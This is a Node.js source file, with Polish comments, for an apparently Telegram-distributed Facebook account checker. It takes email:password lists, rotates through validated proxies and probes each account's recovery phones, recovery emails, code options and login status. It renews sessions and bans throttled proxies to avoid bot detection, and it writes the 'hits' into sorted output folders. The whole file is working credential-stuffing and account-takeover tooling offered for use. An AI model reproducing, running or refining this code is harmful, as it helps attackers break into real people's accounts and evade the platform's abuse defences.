#!/usr/bin/env node
import { writeFileSync, appendFileSync, mkdirSync, existsSync, readFileSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { dirname } from 'node:path';
import { homedir } from 'node:os';
import process from 'node:process';
const { argv, exit } = process;
import { parseAccounts, loadLines, parseProxyLine } from './loaders.js';
import { ProxyRotator, validateProxies, checkMbasicProxy } from './proxy.js';
import { probeAccount, closeBrowser } from './probe.js';
import { createSession } from './httpProbe.js';
import {
    CATEGORY_COLOR,
    Dashboard,
    clearScreen,
    color,
    friendlyDetail,
    hideCursor,
    prompt,
    runMenu,
    showCursor,
    splash,
} from './tui.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const MAX_RETRIES = 3;
const MAX_RATELIMIT_RETRIES = 5;
const MAX_NOTFOUND_RETRIES = 1;
const PROXY_CHECK_TIMEOUT = 12000;
const PROGRESS_FILE = join(homedir(), '.checkter-progress.json');

const HELP = `
Usage: node checkt.js [options]
Options:
  -e, --emails <file>
  -p, --proxies <file>
  -c, --concurrency <n>
  -t, --timeout <ms>
      --no-ui
      --no-proxy
  -h, --help
`;

function loadProgress() {
    try {
        if (!existsSync(PROGRESS_FILE)) return {};
        return JSON.parse(readFileSync(PROGRESS_FILE, 'utf8')) || {};
    } catch {
        return {};
    }
}

function saveProgress(emailPath, nextIndex) {
    try {
        const progress = loadProgress();
        progress[emailPath] = { nextIndex, updatedAt: new Date().toISOString() };
        writeFileSync(PROGRESS_FILE, JSON.stringify(progress, null, 2), 'utf8');
    } catch {
        // ignore persistence failures
    }
}

function clearProgress(emailPath) {
    try {
        const progress = loadProgress();
        if (progress[emailPath]) {
            delete progress[emailPath];
            writeFileSync(PROGRESS_FILE, JSON.stringify(progress, null, 2), 'utf8');
        }
    } catch {
        // ignore persistence failures
    }
}

function parseArgs(a) {
    const opt = {};
    for (let i = 2; i < a.length; i++) {
        const k = a[i];
        const next = () => a[++i];
        switch (k) {
            case '-h': case '--help': opt.help = true; break;
            case '-e': case '--emails': opt.emails = next(); break;
            case '-p': case '--proxies': opt.proxies = next(); break;
            case '-c': case '--concurrency': opt.concurrency = parseInt(next(), 10); break;
            case '-t': case '--timeout': opt.timeout = parseInt(next(), 10); break;
            case '--no-ui': opt.noUi = true; break;
            case '--no-proxy': opt.noProxy = true; break;
            default: console.error('Unknown arg:', k); console.error(HELP); exit(2);
        }
    }
    return opt;
}

function clamp(n, lo, hi) {
    if (!Number.isFinite(n)) return lo;
    return Math.min(hi, Math.max(lo, n));
}

async function gatherConfig(cli) {
    if (cli.emails && cli.proxies) {
        return {
            emailsPath: cli.emails,
            proxiesPath: cli.proxies,
            proxyType: 'http',
            concurrency: clamp(cli.concurrency ?? 10, 1, 40),
            timeout: cli.timeout ?? 45000,
            noUi: !!cli.noUi,
            validatedProxies: null,
        };
    }

    let proxyCheckResult = null;
    let saved = {};

    while (true) {
        const cfg = await runMenu({ ...saved, proxyCheckResult });
        saved = { ...cfg };
        if (cfg.action === 'exit') { showCursor(); exit(0); }
        if (cfg.action === 'check') {
            let rawProxies;
            try { rawProxies = loadLines(cfg.proxiesPath); }
            catch (e) { proxyCheckResult = { total: 0, valid: 0, invalid: 0, validList: [], error: e.message }; continue; }
            clearScreen(); hideCursor();
            const W = () => Math.min(process.stdout.columns || 80, 100);
            const inner = W() - 2;
            process.stdout.write(color.gray + '┌' + '─'.repeat(inner) + '┐' + color.reset + '\n');
            process.stdout.write(color.gray + '│ ' + color.reset + color.gray + `Testowanie ${rawProxies.length} proxy (mbasic)...` + color.reset + '\n');

            // Równoległy test proxy z użyciem checkMbasicProxy (pula współbieżności)
            const total = rawProxies.length;
            const PROXY_CHECK_CONCURRENCY = clamp(saved.concurrency || 30, 5, 50);
            const PROXY_CHECK_TIMEOUT = 12000;
            const renderBar = (done, valid) => {
                const pct = Math.round((done / total) * 100);
                const bar = '█'.repeat(Math.round(pct / 2)) + '░'.repeat(50 - Math.round(pct / 2));
                process.stdout.write(`\r${color.gray}│ ${color.reset}${color.green}${bar}${color.reset} ${color.bold}${done}/${total}${color.reset} OK: ${color.green}${valid}${color.reset}   `);
            };
            renderBar(0, 0);
            const { valid: validList } = await validateProxies(rawProxies, {
                concurrency: PROXY_CHECK_CONCURRENCY,
                timeout: PROXY_CHECK_TIMEOUT,
                checker: (p) => checkMbasicProxy(parseProxyLine(p).proxyUrl, PROXY_CHECK_TIMEOUT, saved.proxyType || 'http'),
                onProgress: (done, _t, valid) => renderBar(done, valid),
            });
            const valid = validList.length;
            proxyCheckResult = { total: rawProxies.length, valid, invalid: total - valid, validList };
            process.stdout.write('\n' + color.gray + '│ ' + color.reset + color.green + `✓ ${valid} OK` + color.reset + color.gray + `  ✗ ${total - valid} BAD` + color.reset + '\n');
            process.stdout.write(color.gray + '└' + '─'.repeat(inner) + '┘' + color.reset + '\n');
            await new Promise(r => setTimeout(r, 1200));
            continue;
        }
        if (cfg.action === 'start') {
            return { ...cfg, concurrency: clamp(cfg.concurrency, 1, 40), timeout: cfg.timeout || 45000, noUi: !!cli.noUi, validatedProxies: proxyCheckResult?.validList || null, proxyCheckDone: !!proxyCheckResult };
        }
    }
}

export function formatHitLine(r) {
    const credPart = r.password ? `${r.email}:${r.password}` : r.email;

    if (r.mailValid) {
        return `${credPart} | FB= Brak | Poczta= Valid | Telegram @Kwasny2`;
    }

    // not_found — konto nie istnieje w FB
    if (r.status === 'not_found') {
        return `${credPart} | SMS= Nie Istnieje | email= Nie Istnieje | Aktywny= BRAK | Kod= BRAK | Telegram @Kwasny2`;
    }

    const sms = (r.phones && r.phones.length) ? r.phones.join(', ') : 'Brak';

    // Lista emaili recovery — bez duplikatów. Jeśli email loginu jest wśród nich,
    // wstaw go na początek. Jeśli go nie ma → 'Brak' (gdy lista pusta) lub
    // sama lista (sygnał BAD: tylko inny email).
    const seen = new Set(); const mailList = [];
    const pushMail = (m) => { const v = (m || '').trim(); if (!v) return; const key = v.toLowerCase(); if (seen.has(key)) return; seen.add(key); mailList.push(v); };
    const loginEmail = String(r.email || '').trim();
    const loginEmailFound = loginEmail && (r.emailFound === true || Array.isArray(r.emails) && r.emails.some(m => String(m || '').toLowerCase() === loginEmail.toLowerCase()));
    if (loginEmailFound) pushMail(loginEmail);
    if (Array.isArray(r.emails)) for (const m of r.emails) pushMail(m);
    const hasCode = r.code === '6' || r.code === '8';
    const canShowCode = hasCode && r.status === 'active' && r.emailFound === true;
    if (mailList.length === 0 && loginEmail && canShowCode) pushMail(loginEmail);

    let mailField;
    if (mailList.length === 0) mailField = 'Brak';
    else mailField = mailList.join(', ');

    let aktywne;
    if (r.status !== 'active') aktywne = 'BRAK';
    else if (!hasCode) aktywne = '-';
    else if (r.active === 'yes') aktywne = 'Tak';
    else if (r.active === 'phone_only') aktywne = 'Tylko numer';
    else aktywne = 'Nie';

    let kod;
    if (canShowCode) kod = `${r.code}c`;
    else if (r.status === 'bad' || r.status === 'not_found') kod = 'BRAK';
    else kod = '-';

    return `${credPart} | SMS= ${sms} | email= ${mailField} | Aktywny= ${aktywne} | Kod= ${kod} | Zalogowano= ${r.loggedIn === true ? 'Tak' : 'Nie'} | Telegram @Kwasny2`;
}

function categorise(r) {
    // FAILED: błędy transportu/proxy/rate limit po retry
    if (r.status === 'error' || r.status === 'rate_limited' || r.status === 'failed') return 'FAILED';

    const isCode = r.code === '8' || r.code === '6';
    const isActive = r.active === 'yes';
    const emailIsLogin = r.emailFound === true;

    if (r.status !== 'active') return 'BAD';
    if (!emailIsLogin) return 'BAD';

    if (isActive && r.code === '8') return 'HIT';
    if (isCode) return 'CUSTOM';

    return 'BAD';
}

function pad2(n) { return String(n).padStart(2, '0'); }

function safePathPart(value) {
    return String(value).replace(/[<>:"/\\|?*]/g, '-');
}

function buildRunDir(rootDir) {
    const d = new Date();
    const stamp = safePathPart(`${pad2(d.getDate())}.${pad2(d.getMonth() + 1)}.${d.getFullYear()}--${pad2(d.getHours())}:${pad2(d.getMinutes())}`);
    const run = join(rootDir, 'DATA_REZULTATY', `FB-${stamp}@Kwasny2`);
    const tree = {
        HITY: join(run, 'HITY'),
        CUSTOMY: join(run, 'CUSTOMY'),
        BAD: join(run, 'BAD'),
        RETRY: join(run, 'RETRY'),
        FAILED: join(run, 'FAILED'),
    };
    for (const p of Object.values(tree)) mkdirSync(p, { recursive: true });
    return {
        root: run,
        files: {
            HIT_8: join(tree.HITY, '8c-active-tak.txt'),
            HIT_6: join(tree.HITY, '6c-active-tak.txt'),
            CUSTOM_8: join(tree.CUSTOMY, '8c-active-nie.txt'),
            CUSTOM_6: join(tree.CUSTOMY, '6c-active-nie.txt'),
            BAD: join(tree.BAD, 'badFB.txt'),
            RETRY: join(tree.RETRY, 'retryFB.txt'),
            FAILED: join(tree.FAILED, 'failedFB.txt'),
        },
    };
}

function targetFileFor(category, r, files) {
    if (category === 'HIT') return r.code === '8' ? files.HIT_8 : files.HIT_6;
    if (category === 'CUSTOM') return r.code === '8' ? files.CUSTOM_8 : files.CUSTOM_6;
    if (category === 'BAD') return files.BAD;
    if (category === 'FAILED') return files.FAILED;
    return null;
}

function appendResult(category, r, files) {
    const path = targetFileFor(category, r, files);
    if (!path) return;
    appendFileSync(path, formatHitLine(r) + '\n', 'utf8');
}

function appendRetry(r, attempt, files) {
    const line = `attempt=${attempt}/${MAX_RETRIES} ${formatHitLine(r)} :: ${r.detail || ''}\n`;
    appendFileSync(files.RETRY, line, 'utf8');
}

// ─────────────────────────────────────────────────────────────────────────────
// Architektura Master-Worker
//
//  ┌─────────────────────────────────────────────────────────────┐
//  │  Master (orkiestrator)                                       │
//  │  ├─ DataPool  — kolejka kont (FIFO + retry-back)             │
//  │  ├─ ProxyPool — round-robin rotator z banowaniem proxy       │
//  │  ├─ Config    — timeout, callbacks, limity retry             │
//  │  └─ Stan      — results[], active, pending (in-flight retry) │
//  │                                                              │
//  │  Workerzy (N niezależnych pętli)                             │
//  │  while alive:                                                │
//  │    job   = master.data.next()                                │
//  │    if !job: jeśli wszystko gotowe → wyjdź; else sleep 50ms   │
//  │    proxy = master.proxies.acquire()                          │
//  │    res   = await probeAccount(job.acct, proxy)               │
//  │    master.handleResult(job, res)                             │
// ─────────────────────────────────────────────────────────────────

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

class DataPool {
    constructor(accounts) {
        this.queue = accounts.map((acct, idx) => ({
            idx: acct.__originalIndex != null ? acct.__originalIndex : idx,
            acct, attempts: 0, rateAttempts: 0, notFoundAttempts: 0,
        }));
    }
    next() { return this.queue.shift(); }
    pushBack(job) { this.queue.push(job); }
    size() { return this.queue.length; }
}

class ProxyPool {
    constructor(rotator) { this.rotator = rotator; }
    acquire() { return this.rotator.next(); }
    burn(proxy, durationMs) { this.rotator.markBanned(proxy, durationMs); }
    size() { return this.rotator.size(); }
}

// Po ilu jobach worker rotuje session (świeże ciastka + UA + profile) — by nie zostać oznaczonym jako trwały bot
const SESSION_MAX_JOBS = 25;

class Worker {
    constructor(id, master) {
        this.id = id;
        this.master = master;
        this.alive = true;
        this.session = createSession();   // sticky cookie jar + UA per worker
    }

    // Wymuszone odświeżenie session: po wyczerpaniu limitu lub gdy proxy wpadło w ban/checkpoint
    rotateSession(reason) {
        this.session = createSession();
        if (this.master.callbacks.onSessionRotate) {
            this.master.callbacks.onSessionRotate(this.id, reason);
        }
    }

    async run() {
        const m = this.master;
        while (this.alive) {
            const job = m.data.next();
            if (!job) {
                if (m.allDone()) break;
                await sleep(50);
                continue;
            }
            if (this.session.jobs >= SESSION_MAX_JOBS) this.rotateSession('max_jobs');
            m.activeChange(+1);
            let proxy = null;
            try {
                proxy = m.proxies.acquire();
                const r = await probeAccount(job.acct.email, proxy, {
                    timeout: m.timeout,
                    password: job.acct.password,
                    session: this.session,
                });
                // Po rate_limit / checkpoint — wypal session razem z proxy
                if (r.status === 'rate_limited' || r.status === 'checkpoint') {
                    this.rotateSession(r.status);
                }
                r.proxy = proxy;
                m.handleResult(job, r, proxy);
            } catch (e) {
                const fallback = {
                    email: job.acct.email, password: job.acct.password,
                    active: 'no', code: '-', channel: '-', emails: [], phones: [],
                    status: 'error', detail: `worker:${e.message}`, recoverUrl: '', proxy,
                    mailValid: false,
                };
                m.handleResult(job, fallback, proxy);
            } finally {
                m.activeChange(-1);
            }
        }
    }
}

class Master {
    constructor({ accounts, rotator, concurrency, timeout, callbacks }) {
        this.data = new DataPool(accounts);
        this.proxies = new ProxyPool(rotator);
        this.concurrency = concurrency;
        this.timeout = timeout;
        this.callbacks = callbacks;
        this.results = new Array(accounts.length);
        this.active = 0;
        this.pending = 0;   // retry zaplanowane przez setTimeout, jeszcze nie w queue
    }

    activeChange(delta) {
        this.active += delta;
        this.callbacks.onActive(this.active);
    }

    allDone() {
        return this.data.size() === 0 && this.active === 0 && this.pending === 0;
    }

    scheduleRetry(job, delay) {
        this.pending++;
        setTimeout(() => {
            this.pending--;
            this.data.pushBack(job);
        }, delay);
    }

    handleResult(job, r, proxy) {
        // ─ rate_limit: zbanuj proxy i retry
        if (r.status === 'rate_limited') {
            const banMs = this.proxies.size() <= 3 ? 15_000 : 45_000;
            if (proxy) this.proxies.burn(proxy, banMs);
            if (job.rateAttempts < MAX_RATELIMIT_RETRIES - 1) {
                this.callbacks.onRetry(r, job.rateAttempts + 1);
                this.scheduleRetry({ ...job, rateAttempts: job.rateAttempts + 1 }, 1000 + Math.random() * 3000);
                return;
            }
        }
        // ─ not_found: jeden ponowny check (czasem flase-negative przy bocie)
        if (r.status === 'not_found' && job.notFoundAttempts < MAX_NOTFOUND_RETRIES) {
            this.callbacks.onRetry(r, job.notFoundAttempts + 1);
            this.data.pushBack({ ...job, notFoundAttempts: job.notFoundAttempts + 1 });
            return;
        }
        // ─ retry transient (timeout, bloks no_signal, transport): powtórz z innym proxy
        if (r.status === 'retry' && job.attempts < MAX_RETRIES - 1) {
            this.callbacks.onRetry(r, job.attempts + 1);
            this.scheduleRetry({ ...job, attempts: job.attempts + 1 }, 600 + Math.random() * 900);
            return;
        }
        // ─ wyczerpane retry: status=failed
        if (r.status === 'retry') {
            r.status = 'failed';
            r.detail = r.detail || `failed_after_${MAX_RETRIES}_retries`;
        }
        this.results[job.idx] = r;
        r.accountIndex = job.idx;
        this.callbacks.onResult(r, job.attempts);
    }

    async run() {
        if (this.data.size() === 0) return this.results;
        const workers = Array.from({ length: this.concurrency }, (_, i) => new Worker(i, this));
        await Promise.all(workers.map(w => w.run()));
        return this.results;
    }
}

async function main() {
    const cli = parseArgs(argv);
    if (cli.help) { console.log(HELP); return; }
    const cfg = await gatherConfig(cli);
    let accounts, proxies = [];
    const absEmailsPath = resolve(cfg.emailsPath);
    const savedProgress = loadProgress();
    let resumeIndex = Number(savedProgress[absEmailsPath]?.nextIndex || 0);
    try { accounts = parseAccounts(loadLines(cfg.emailsPath)).map((acct, idx) => ({ ...acct, __originalIndex: idx })); } catch (e) { console.error(color.red + 'ERROR:' + color.reset + ' ' + e.message); exit(1); }
    try { proxies = loadLines(cfg.proxiesPath); } catch (e) { console.error(color.red + 'ERROR:' + color.reset + ' proxy file: ' + e.message); exit(1); }
    if (!proxies.length) { console.error(color.red + 'ERROR:' + color.reset + ' Proxy list is required.'); exit(1); }
    if (!accounts.length) { console.error(color.red + 'ERROR:' + color.reset + ' No accounts to check.'); exit(1); }

    let rotatorList;
    if (resumeIndex > 0) {
        if (resumeIndex >= accounts.length) {
            clearProgress(absEmailsPath);
            console.log(color.gray + `Lista ${cfg.emailsPath} jest już sprawdzona. Rozpoczynam od początku.` + color.reset);
            resumeIndex = 0;
        } else {
            console.log(color.gray + `Wznawianie sprawdzania listy od pozycji ${resumeIndex + 1}/${accounts.length}` + color.reset);
        }
    }
    let remainingAccounts = resumeIndex > 0 ? accounts.filter(a => a.__originalIndex >= resumeIndex) : accounts;
    if (resumeIndex > 0 && remainingAccounts.length === 0) {
        clearProgress(absEmailsPath);
        remainingAccounts = accounts;
        resumeIndex = 0;
    }

    if (cfg.proxyCheckDone) {
        // Użytkownik już zrobił ręczny test proxy w TUI — nie powtarzaj
        rotatorList = (cfg.validatedProxies && cfg.validatedProxies.length > 0) ? cfg.validatedProxies : proxies;
        console.log(color.gray + `Proxy: ${rotatorList.length}/${proxies.length} (z ręcznego testu).` + color.reset);
    } else {
        // Automatyczne sprawdzenie przed startem (tylko gdy pominięto krok check w TUI)
        if (cli.noProxy) {
            rotatorList = proxies;
            console.log(color.gray + 'Pominięto sprawdzenie proxy (--no-proxy).' + color.reset);
        } else {
            console.log(color.gray + 'Weryfikacja proxy z mbasic.facebook.com...' + color.reset);
            const mbasicCheckResults = await Promise.all(proxies.map(async (p) => {
                const { proxyUrl } = parseProxyLine(p);
                return { proxy: p, ok: await checkMbasicProxy(proxyUrl, PROXY_CHECK_TIMEOUT, cfg.proxyType || 'http') };
            }));
            rotatorList = mbasicCheckResults.filter(r => r.ok).map(r => r.proxy);
            console.log(color.gray + `Proxy sprawne: ${rotatorList.length}/${proxies.length}` + color.reset);
            if (rotatorList.length === 0) {
                console.error(color.red + 'ERROR:' + color.reset + ' Żadne proxy nie działa z mbasic.facebook.com');
                exit(1);
            }
        }
    }
    const rotator = new ProxyRotator(rotatorList, cfg.proxyType || 'http');
    const run = buildRunDir(__dirname);
    let aborted = false;
    let results = [];

    if (cfg.noUi) {
        console.log(`Checkter • ${remainingAccounts.length}/${accounts.length} accounts remaining • c=${cfg.concurrency} • ${rotator.size()} proxies`);
        console.log(color.gray + '→ ' + run.root + color.reset);
        let done = 0;
        const master = new Master({
            accounts: remainingAccounts, rotator,
            concurrency: cfg.concurrency,
            timeout: cfg.timeout,
            callbacks: {
                onResult: (r) => { saveProgress(absEmailsPath, r.accountIndex + 1); const cat = categorise(r); appendResult(cat, r, run.files); done++; const col = CATEGORY_COLOR[cat] || color.gray; console.log(`${col}[${cat.padEnd(6)}]${color.reset} ${done}/${remainingAccounts.length} (${((done / remainingAccounts.length) * 100).toFixed(1)}%) ${formatHitLine(r)}`); },
                onRetry: (r, attempt) => { appendRetry(r, attempt, run.files); console.log(`${color.blue}[RETRY ${attempt}/${MAX_RETRIES}]${color.reset} ${formatHitLine(r)} ${color.gray}:: ${friendlyDetail(r.detail, r.proxy)}${color.reset}`); },
                onActive: () => { },
            },
        });
        results = await master.run();
    } else {
        const dash = new Dashboard({ total: remainingAccounts.length, workers: cfg.concurrency, proxies: rotator.size() });
        hideCursor(); clearScreen(); dash.render();
        const interval = setInterval(() => dash.render(), 250);
        process.on('SIGINT', async () => { aborted = true; clearInterval(interval); showCursor(); console.log('\n' + color.yellow + 'Aborted by user — partial output already on disk at:' + color.reset); console.log('  ' + run.root); try { await closeBrowser(); } catch { } exit(130); });
        const master = new Master({
            accounts: remainingAccounts, rotator,
            concurrency: cfg.concurrency,
            timeout: cfg.timeout,
            callbacks: {
                onResult: (r) => { saveProgress(absEmailsPath, r.accountIndex + 1); const cat = categorise(r); appendResult(cat, r, run.files); dash.ingest(cat, r); },
                onRetry: (r, attempt) => { appendRetry(r, attempt, run.files); dash.retryEvent(r); },
                onActive: (n) => dash.setActiveWorkers(n),
            },
        });
        results = await master.run();
        clearInterval(interval); dash.render(); showCursor(); console.log();
    }
    if (!aborted) {
        clearProgress(absEmailsPath);
        console.log(color.cyan + `→ Output written to ${run.root}` + color.reset);
    }
    try { await closeBrowser(); } catch { }
    // Użyj tej samej kategoryzacji co Dashboard / pliki wyjściowe — inaczej Done
    // pokazuje inne liczby niż live feed (np. Dashboard BAD=19, Done HIT=16).
    const cats = results.filter(Boolean).map(r => categorise(r));
    const cnt = (c) => cats.filter(x => x === c).length;
    console.log(
        `${color.bold}Done${color.reset}  ` +
        `${color.green}HIT=${cnt('HIT')}${color.reset}  ` +
        `${color.orange}CUSTOM=${cnt('CUSTOM')}${color.reset}  ` +
        `${color.red}BAD=${cnt('BAD')}${color.reset}  ` +
        `${color.purple}FAILED=${cnt('FAILED')}${color.reset}`
    );
}
main().catch(async (e) => { showCursor(); try { await closeBrowser(); } catch { } console.error(color.red + 'Fatal:' + color.reset, e); exit(1); });